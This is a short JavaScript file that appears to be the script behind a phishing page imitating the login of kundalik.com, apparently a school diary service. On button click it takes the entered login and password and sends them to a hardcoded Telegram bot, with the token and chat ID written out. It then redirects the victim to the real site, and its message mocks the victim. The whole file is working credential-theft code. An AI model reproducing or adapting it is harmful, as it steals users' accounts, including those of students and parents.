let TELEGRAM_BOT_TOKEN = '6879050469:AAGMyUwzKGn-iCFV-79i3pbPTcWlldN07Nk'
let TELEGRAM_BOT_URL = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`
let TELEGRAM_CHAT_ID = '6654178666'

let inputs = document.querySelectorAll('input')
let button = document.querySelector('button')

button.addEventListener('click', (event) => {
    event.preventDefault()
    sendMessageToBot()

    window.location.href = "https://login.kundalik.com/"
})

function sendMessageToBot(e) {
    fetch(TELEGRAM_BOT_URL, {
        method: "POST",
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({
            chat_id: TELEGRAM_CHAT_ID,
            text: `\n YEB QOYGAN BOLANI ACCOUNTI \n Login: ${inputs[0].value} \n Password: ${inputs[1].value} `
        })
    })
        .then(response => response.json())
        .then(data => {
            console.log('Message sent successfully:', data);
        })
        .catch(error => {
            console.error('Error sending message:', error);
        });
}